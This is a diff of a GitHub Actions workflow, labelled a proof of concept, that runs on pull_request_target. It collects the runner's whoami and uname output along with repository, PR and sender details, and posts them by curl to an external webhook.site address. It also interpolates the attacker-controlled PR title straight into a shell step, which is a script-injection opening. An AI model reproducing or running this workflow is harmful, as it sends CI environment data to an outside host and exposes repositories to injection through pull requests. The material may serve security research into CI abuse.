@@ -2,26 +2,66 @@ name: PoC Workflow
 
 on:
   pull_request_target:
-    branches: [ main ]
+    types: [opened, synchronize, reopened]
+    branches: [ main, master ]
+
+permissions:
+  contents: read
 
 jobs:
   poc:
     runs-on: ubuntu-latest
     steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+        
       - name: Run system commands
+        id: sysinfo
         run: |
-          echo "### System Information"
-          whoami
-          echo ""
-          uname -a
-          echo ""
-          echo "Current directory: $(pwd)"
-          echo "### End of System Info"
+          echo "Running system commands..."
+          WHOAMI=$(whoami)
+          UNAME=$(uname -a)
+          PWD=$(pwd)
+          
+          echo "whoami_output=$WHOAMI" >> $GITHUB_OUTPUT
+          echo "uname_output=$UNAME" >> $GITHUB_OUTPUT
+          
+          echo "### System Information ###"
+          echo "User: $WHOAMI"
+          echo "System: $UNAME"
+          echo "Directory: $PWD"
+          echo "Repository: ${{ github.repository }}"
+          echo "PR Number: ${{ github.event.pull_request.number }}"
+          echo "Sender: ${{ github.event.sender.login }}"
+          echo "### End System Info ###"
       
-      - name: Send to webhook
+      - name: Send to Webhook
         run: |
-          SYSTEM_INFO=$(whoami && echo "" && uname -a)
+          # Format JSON payload
+          JSON_PAYLOAD=$(cat <<EOF
+          {
+            "event": "pull_request_target",
+            "repository": "${{ github.repository }}",
+            "pr_number": "${{ github.event.pull_request.number }}",
+            "pr_title": "${{ github.event.pull_request.title }}",
+            "sender": "${{ github.event.sender.login }}",
+            "whoami": "${{ steps.sysinfo.outputs.whoami_output }}",
+            "uname": "${{ steps.sysinfo.outputs.uname_output }}",
+            "triggered_by": "${{ github.event_name }}",
+            "timestamp": "$(date -u +'%Y-%m-%dT%H:%M:%SZ')",
+            "github_run_id": "${{ github.run_id }}"
+          }
+          EOF
+          )
+          
+          echo "Sending to webhook..."
+          echo "Payload: $JSON_PAYLOAD"
+          
+          # Send to webhook
           curl -X POST \
             -H "Content-Type: application/json" \
-            -d "{\"event\":\"pull_request_target\",\"system_info\":\"$SYSTEM_INFO\",\"repository\":\"${{ github.repository }}\",\"pr_number\":\"${{ github.event.pull_request.number }}\",\"sender\":\"${{ github.event.sender.login }}\"}" \
+            -H "User-Agent: GitHub-Actions-Webhook" \
+            -d "$JSON_PAYLOAD" \
             https://webhook.site/b2742a99-b62e-4b05-8541-3c40ba9da57b
+          
+          echo "Webhook sent!"
